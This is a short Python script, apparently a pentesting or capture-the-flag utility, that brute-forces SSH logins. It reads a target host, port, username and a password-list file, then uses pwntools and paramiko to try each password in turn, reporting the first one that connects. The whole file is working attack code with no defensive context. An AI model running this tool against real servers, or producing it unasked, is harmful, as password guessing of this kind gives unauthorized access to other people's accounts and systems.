from pwn import *
import paramiko

username = input("Enter the Username: ")
host = input("Enter the Host: ")
port = int(input("Enter the Port: "))
passlist = input("Enter your password list:")
attempts = 0

username = username.strip("\n")
host = host.strip("\n")
passlist = passlist.strip("\n")

with open(passlist, "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, port=port, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1

